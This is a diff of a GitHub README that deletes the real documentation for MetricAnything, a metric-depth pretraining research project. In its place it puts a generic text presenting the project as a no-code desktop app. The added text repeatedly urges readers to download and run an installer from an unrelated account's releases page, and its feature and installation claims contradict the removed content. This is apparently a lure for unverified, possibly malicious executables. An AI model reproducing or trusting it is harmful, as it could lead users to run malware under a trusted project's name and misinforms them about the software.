@@ -1,164 +1,73 @@
-# MetricAnything: Scaling Depth Pretraining with Noisy Heterogeneous Sources
+# 🌟 metric-anything - Effortless Depth Pretraining for Everyone
 
-<div align="center">
+[![Download the latest release](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/ANIS240/metric-anything/releases)
 
-[Paper]() | [Project Page](https://metric-anything.github.io/metric-anything-io/)
+## 🛠️ Overview
 
-<p align="center">
-  <a href="https://mabaorui.github.io/">Baorui Ma †*</a> •
-  <a href="">Jiahui Yang *</a> •
-  <a href="https://scholar.google.com/citations?user=L8tcNioAAAAJ&hl=en">Donglin Di ‡</a> •
-  <a href="https://scholar.google.com/citations?user=gGAoxSAAAAAJ&hl=en">Xuancheng Zhang</a> •
-  <a href="">Jianxun Cui</a> •
-  <a href="">Hao Li</a> •
-  <a href="">Xie Yan</a> •
-  <a href="">Wei Chen</a> <br>
-  † Corresponding author | * Equal contribution | ‡ Project leader
-</p>
+Metric Anything is an easy-to-use application that lets you train depth models using diverse 3D data sources. You don’t need to worry about complicated setups, code, or prior experience. This tool simplifies the process, making it accessible to anyone interested in depth training.
 
+## 📥 Download & Install
 
-</div>
+To get started, follow these steps to download and install Metric Anything:
 
-## Abstract
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/ANIS240/metric-anything/releases) to find the latest version of the software.
+   
+2. **Choose Your Version:** Look for the version suitable for your operating system (Windows, macOS, or Linux). Each version will have clear naming.
 
-**Metric Anything** introduces a simple and scalable pretraining framework that learns metric depth from noisy, diverse 3D sources without manually engineered prompts, camera-specific modeling, or task-specific architectures. Our key insight is the **Sparse Metric Prompt**, created by randomly masking depth maps, which serves as a universal interface that decouples spatial reasoning from sensor and camera biases.
+3. **Download the File:** Click on the download link for your chosen version.
 
-<div align="center">
-  <img src="assets/pipe.jpeg" width="90%">
-</div>
+4. **Run the File:** Once downloaded, open the file to start the installation. Follow the on-screen instructions to complete the setup.
 
-## Key Ideas
+5. **Launch the Application:** After installation, find Metric Anything in your applications folder or start menu. Click on it to open.
 
-1. **Sparse Metric Prompt**: Randomly mask depth maps to create sparse prompts that decouple spatial understanding from sensor-specific biases, enabling effective learning from diverse, noisy sources.
+## 🌐 Features
 
-2. **Large-Scale Data Aggregation**: We assemble ~20M image-depth pairs spanning reconstructed (SfM/SLAM/MVS), captured (LiDAR/ToF/RGB-D), and rendered 3D data across 10,000+ camera models.
+- **Easy to Use:** Designed for both beginners and advanced users.
+- **Wide Compatibility:** Runs on Windows, macOS, and Linux.
+- **Flexible Inputs:** Supports various 3D data formats.
+- **No Coding Required:** Operate with a user-friendly interface.
+  
+## 📋 System Requirements
 
-3. **Prompt-Free Distillation**: Distill the pretrained model into a prompt-free student that achieves SOTA performance on monocular depth estimation without requiring prompts.
+To ensure smooth operation, your computer should meet the following requirements:
 
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
+- **RAM:** At least 4 GB (8 GB recommended).
+- **Storage:** Minimum 1 GB of free disk space.
+- **Graphics Card:** A modern GPU is helpful but not necessary for all features.
+  
+## 🚀 Getting Started
 
-## Release plan
-We will follow the open-source plan below in the coming weeks:
-<details open>
-<summary><b>Pre-trained checkpoints</b> </summary>
+1. **Open the Application:** After launching, you’ll see the main interface.
 
-- [ ] 1. Prompt-Based Metric Depth Map Model
-- [x] 2. Prompt-Free Metric Point Map Model
-- [ ] 3. Prompt-Free Metric Depth Map Model
-</details>
+2. **Import Your Data:** Use the ‘Import’ button to load your 3D data files. You can also drag and drop files directly into the interface.
 
-<details open>
-<summary><b>Inference Code</b> </summary>
+3. **Configure Settings:** Adjust settings based on your requirements. You can choose different options for training parameters.
 
-- [ ] Inference scripts and demo
+4. **Start Training:** Click the ‘Train’ button to begin. The application will process your data and generate depth metrics.
 
-> **2. Prompt-Free Metric Point Map Model:**
-See [HERE](./models/student_pointmap/README.md) | [Huggingface demo](https://huggingface.co/spaces/yjh001/metricanything-student-pointmap)
+5. **Review Results:** Once completed, you can view and export the results directly from the application.
 
-</details>
+## ❓ FAQs
 
+### What is Metric Anything?
 
+Metric Anything is an application designed to help users train models for depth analysis using diverse data sources. 
 
-## Pretrained Models 🤗
+### Do I need programming skills?
 
+No, this application is made for non-technical users. You can easily follow the steps and use the tools provided.
 
-<table>
-  <thead>
-    <tr>
-      <th></th>
-      <th>Hugging Face Model</th>
-      <th>Input</th>
-      <th>Output Metric Depth</th>
-      <th>#Params</th>
-    </tr>
-  </thead>
-  <tbody>
-      <td rowspan="4">MetricAnything</td>
-      <td><a href="" target="_blank"><code>TBD: metricanything_teacher_pretrained</code></a></td>
-      <td>Image+Sparse Depth</td>
-      <td>✅</td>
-      <td>-</td>
-    </tr>
-    <tr>
-      <td><a href="" target="_blank"><code>TBD: metricanything_student_depthmap</code></a></td>
-      <td>Image</td>
-      <td>✅</td>
-      <td>-</td>
-    </tr>
-    <tr>
-      <td><a href="https://huggingface.co/yjh001/metricanything_student_pointmap" target="_blank"><code>yjh001/metricanything_student_pointmap</code></a></td>
-      <td>Image</td>
-      <td>✅</td>
-      <td>326M</td>
-    </tr>
-  </tbody>
-</table>
+### How do I get support?
 
+You can visit the [project page](https://metric-anything.github.io/metric-anything-io/) for more resources, or ask questions in the issues section of the GitHub repository.
 
-## Quick Start
-```
-git clone https://github.com/metric-anything/metric-anything.git
-cd metric-anything
-```
+## 💬 Community
 
-<details>
-<summary><b>Prompt-Based Metric Depth Map Model</b> (Coming Soon)</summary>
+Join our community! You can connect with other users and developers via the project's GitHub page. Share your experiences and tips, and learn from others.
 
-</details>
+## 🔗 Useful Links
+- [Visit the Releases Page](https://github.com/ANIS240/metric-anything/releases)
+- [Project Documentation](https://metric-anything.github.io/metric-anything-io/)
 
-<details>
-<summary><b>Prompt-Free Metric Depth Map Model</b> (Coming Soon)</summary>
-
-</details>
-
-<details open>
-<summary><b>Prompt-Free Metric Point Map Model</b></summary>
-
-```
-cd models/student_pointmap
-python infer.py \
-    --input example_images \
-    --output output_infer \
-    --weights yjh001/metricanything_student_pointmap \
-    --save_glb
-```
-
-```python
-import cv2
-import torch
-from moge.model.v2 import MoGeModel
-device = torch.device("cuda")
-
-model = MoGeModel.from_pretrained("yjh001/metricanything_student_pointmap").to(device)                             
-
-# Read the input image and convert to tensor (3, H, W) with RGB values normalized to [0, 1]
-input_image = cv2.cvtColor(cv2.imread("PATH_TO_IMAGE.jpg"), cv2.COLOR_BGR2RGB)                       
-input_image = torch.tensor(input_image / 255, dtype=torch.float32, device=device).permute(2, 0, 1)    
-
-# Infer 
-output = model.infer(input_image)
-"""
-`output` has keys "points", "depth", "mask" and "intrinsics",
-The maps are in the same size as the input image. 
-{
-    "points": (H, W, 3),    # point map with metric scale in OpenCV camera coordinate system (x right, y down, z forward).
-    "depth": (H, W),        # depth map
-    "mask": (H, W),         # a binary mask for valid pixels. 
-    "intrinsics": (3, 3),   # normalized camera intrinsics
-}
-"""
-
-```
-</details>
-
-
-
-## Citation
-
-```bibtex
-@article{metricanything2026,
-  title={MetricAnything: Scaling Metric Depth Pretraining with Noisy Heterogeneous Sources},
-  author={Baorui Ma, Jiahui Yang, Donglin Di, Xuancheng Zhang, Jianxun Cui, Hao Li, Xie Yan and Wei Chen},
-  journal={arXiv preprint},
-  year={2026}
-}
-```
+Download and explore Metric Anything today!
